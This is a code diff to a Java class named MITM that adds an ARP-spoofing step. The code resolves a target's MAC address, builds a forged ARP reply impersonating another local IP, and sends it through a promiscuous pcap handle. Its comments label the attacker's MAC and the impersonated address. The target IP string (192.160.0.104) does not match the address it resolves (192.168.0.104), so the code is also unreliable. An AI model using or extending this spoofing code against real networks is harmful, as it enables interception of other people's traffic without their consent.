@@ -30,9 +30,39 @@ public class MITM{
 
         //SendArpRequestTemplate.run(s);
 
-        MacAddress resolved = ARP.resolveMacFromIP("192.168.0.104");
+       // MacAddress resolved = ARP.resolveMacFromIP("192.168.0.104");
 
-        System.out.println("RESOLVED ADDRESS: " + resolved.getAddress().toString());
+        //System.out.println("RESOLVED ADDRESS: " + resolved.getAddress().toString());
+
+        MacAddress address = null;
+
+        try{
+            address = MacAddressResolver.resolveMacAddress(InetAddress.getByName("192.168.0.104"));
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        System.out.println("MAC: " + address);
+
+        PcapNetworkInterface networkInterface = MacAddressResolver.getAvailableNetworkInterface();
+        String targetIP = "192.160.0.104";
+        String sourceIPString = networkInterface.getAddresses().getFirst().getAddress().toString();
+
+        //Attackers Mac Address
+        MacAddress sourceMac = MacAddress.getByAddress(networkInterface.getLinkLayerAddresses().getFirst().getAddress());
+        //TODO: we only want to target one device. do we do broadcast MAC?
+        MacAddress destinationMac = address;
+
+        //Impersonated IP
+        InetAddress sourceIP = InetAddress.getByName("192.168.0.67");
+        //targeted IP
+        InetAddress destinationIP = InetAddress.getByName(targetIP);
+
+        Packet spoofedPacket = arpHelper.createArpPacket(sourceIP, destinationIP, sourceMac, destinationMac, ArpOperation.REPLY);
+
+        PcapHandle sendHandle = networkInterface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
+
+        sendHandle.sendPacket(spoofedPacket);
     }
 
     private static void sendSPoofedArp() throws PcapNativeException, UnknownHostException, NotOpenException {
